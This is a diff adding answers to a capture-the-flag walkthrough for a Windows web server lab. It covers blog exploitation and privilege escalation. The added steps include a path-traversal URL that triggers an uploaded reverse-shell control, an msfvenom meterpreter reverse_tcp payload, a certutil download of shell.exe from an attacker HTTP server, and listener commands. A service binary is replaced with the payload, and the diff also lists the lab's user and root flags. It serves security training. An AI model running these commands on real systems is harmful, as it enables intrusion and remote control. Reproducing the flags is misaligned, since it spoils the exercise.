@@ -109,7 +109,7 @@ Using the public exploit, gain initial access to the server.
 
 * Who is the webserver running as?
 
-	``
+	`iis apppool\blog`
 
 	* Download script
 	
@@ -119,7 +119,7 @@ Using the public exploit, gain initial access to the server.
 
 		![task3-download](./images/task3-download.png)
 
-	* Edit script file to connect attacker machine IP & Port. Save the file as PostList.ascx
+	* Edit script file to connect attacker machine IP & Port. Save the file as PostView.ascx
 	
 		![task3-edit](./images/task3-edit.png)
 
@@ -139,14 +139,13 @@ Using the public exploit, gain initial access to the server.
 	
 		![task3-manajer](./images/task3-manajer.png)
 
-	* Upload file PostList.ascx
+	* Upload file PostView.ascx
 	
 		![task3-upload](./images/task3-upload.png)
 
-	* Then, as the exploit said, navigate to 10.10.253.78/?theme=../../App_Data/files to trigger the file
+	* Then, as the exploit said, navigate to http://10.10.136.100/?theme=../../App_Data/files to trigger the file and get the reverse shell
 	
-		
-
+		![task3-shell](./images/task3-shell.png)
 
 ## Task 4 - Windows Privilege Escalation
 
@@ -158,26 +157,112 @@ First we will pivot from netcat to a meterpreter session and use this to enumera
 
 ### Answer the questions below
 
-Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom. If you don't know how to do this, I suggest checking out the [Metasploit module](https://tryhackme.com/module/metasploit)!
+* Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom. If you don't know how to do this, I suggest checking out the [Metasploit module](https://tryhackme.com/module/metasploit)!
 
 
-* _Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!_
+	_Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!_
+
+	* Create payload file
+	
+		```
+		msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.17.127.223 LPORT=5555 -f exe -o shell.exe
+		```
+
+		![task4-payload](./images/task4-payload.png)
+
+	* Setup HTTP server on attacker machine
+	
+		```
+		python3 -m http.server 8000
+		```
+
+	* Download shell file on target machine
+	
+		```
+		certutil.exe -urlcache -f http://10.17.127.223:8000/shell.exe C:/Windows/Temp/shell.exe
+		```
+
+		![task4-download](./images/task4-download.png)
+
+	* Setup meterpreter listener on attacker machine
+	
+		```
+		msfconsole -q -x "use exploit/multi/handler; set LHOST 10.17.127.223; set LPORT 5555; set PAYLOAD windows/meterpreter/reverse_tcp; exploit"
+		```
+
+		![task4-msfconsole](./images/task4-msfconsole.png)
+
+	* Run file payload to get the reverse shell
+	
+		```
+		C:\Windows\Temp\shell.exe
+		```
+
+		![task4-meterpreter](./image/task4-meterpreter.png)
+
 
 You can run metasploit commands such as **sysinfo** to get detailed information about the Windows system. Then feed this information into the [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) script and quickly identify any obvious vulnerabilities.
 
 * What is the OS version of this windows machine?
 
+	`Windows 2012 R2 (6.3 Build 9600)`
+
 Further enumerate the machine.
+
+1. Upload WinPEAS to target machine
+
+	```
+	cd C:/Windows/Temp
+	upload ./winPEASx86.exe
+	```
+
+2. Run WinPEAS
+
+	![task4-winpeas](./images/task4-winpeas.png)
 
 * What is the name of the abnormal _service_ running?
 
+	`WindowsScheduler`
+
+	![task4-wservice](./images/task4-wservice.png)
+
 * What is the name of the binary you're supposed to exploit? 
+
+	`Message.exe`
+
+	![task4-events](./images/task4-events.png)
 
 Using this abnormal service, escalate your privileges!
 
 * What is the user flag (on Jeffs Desktop)?
 
+	`759bd8af507517bcfaede78a21a73e39`
+
+	* Rename file `Message.exe` to `Message.bak`
+	
+		![task4-message-bak](./images/task4-message-bak.png)
+	
+	* Copy our previos file payload from "C:\Windows\Temp\shell.exe" to "C:\Program Files (x86)\SystemScheduler\Message.exe"
+	
+		![task4-copy](./images/task4-copy.png)
+	
+	* Setup meterpreter listener on attacker machine
+	
+		```
+		msfconsole -q -x "use exploit/multi/handler; set LHOST 10.17.127.223; set LPORT 5555; set PAYLOAD windows/meterpreter/reverse_tcp; exploit"
+		```
+
+		![task4-msfconsole](./images/task4-msfconsole.png)
+	
+	* Get the shell & user flag
+	
+		![task4-flag](./images/task4-flag.png)
+
 * What is the root flag?
+
+	`7e13d97f05f7ceb9881a3eb3d78d3e72`
+	
+	![task4-root](./images/task4-root.png)
 
 ## Task 5 - Privilege Escalation Without Metasploit
 
